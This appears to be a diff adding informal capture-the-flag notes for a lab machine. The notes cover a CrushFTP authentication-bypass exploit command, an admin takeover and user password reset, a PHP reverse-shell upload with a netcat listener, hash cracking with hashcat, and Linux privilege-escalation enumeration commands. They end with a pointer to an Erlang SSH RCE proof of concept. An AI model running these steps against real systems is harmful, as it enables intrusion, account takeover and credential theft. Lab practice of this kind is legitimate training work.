@@ -30,3 +30,150 @@ so nuclei found a crush FTP exploit
 we intercept the login attempt, 
 
 remove the password and only have the username and containing only a forward slash
+
+
+google for CVE using 
+CVE-2025-31161 site:github.com
+do a git clone 
+
+search for crushftp admin name
+
+using the exploit by 
+
+cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user Testingadmin --password test
+
+after logging in
+
+find the users section and change the password for the user ben
+logout as admin 
+
+log back in using ben's new credentials 
+
+find upload button
+
+create a reverse shell
+
+code shell.php 
+
+use php reverse shell link "https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"
+
+upload shell.php
+
+go to the main domain site 
+
+start netcat listener 
+nc -lvnp 9001
+
+enter the http://soulmate.htb/shell.php
+
+after getting reverse shell
+
+enter
+ python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+CTRL + z
+
+stty raw -echo;fg
+
+enter *2
+
+we can start searching for databases
+
+start searching for config files in the soulmate.htb folder 
+
+use hashcat bcrypt mode to break the hash
+
+hashcat -m 3200 -a 0 passwordhash /usr/share/wordlists/rockyou.txt 
+
+hashcat did not work,
+
+using linpeas.sh to find vulnerabilities or something helpful
+
+download linpeas.sh
+mkdir www 
+move the file to www
+
+start a python server on local machine 
+
+on reverse shell 
+
+wget http://ip:port/linpeas.sh
+
+in the linpeas outcome, 
+
+search for Executable files potentially added by user
+
+cat /usr/local/lib/erlang_login/start.escript
+
+after logging in with Ben
+
+go back to the nmap scan and find the openssh vulnerabilities
+
+We'll start out by checking out what operating system and version we are dealing with.
+
+cat /etc/os-release
+
+
+For whatever version we encounter its important to see if we're dealing with something out-of-date or maintained
+
+https://ubuntu.com/about/release-cycle
+
+check out our current user's PATH, which is where the Linux system looks every time a command is executed for any executables to match the name of what we type
+
+echo $PATH
+
+We can also check out all environment variables that are set for our current user
+may get lucky and find something sensitive in there such as a password. We'll note this down and move on.
+
+env
+
+We can do some searches to see if the target is running a vulnerable Kernel
+
+cat /proc/version
+
+We can next gather some additional information about the host itself such as the CPU type/version:
+lscpu
+
+What login shells exist on the server? Note these down and highlight that both Tmux and Screen are available to us.
+
+cat /etc/shells
+
+Can we find any types of credentials in fstab for mounted drives by grepping for common words such as password, username, credential, etc in /etc/fstab?
+
+cat /etc/fstab
+
+look in history
+
+find history files
+
+find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
+
+look for cron 
+ls -la /etc/cron.daily/
+
+proc filesystem
+find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
+
+
+Sudo Version
+sudo -V
+
+Binaries
+ls -l /bin /usr/bin/ /usr/sbin/
+
+use linpeas
+
+
+Configuration Files
+find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
+
+
+look for  Erlang SSH you will have this in you LinPeas
+
+look for erllang ssh version 
+
+erl -s erlang halt
+using this github 
+https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC
+
+
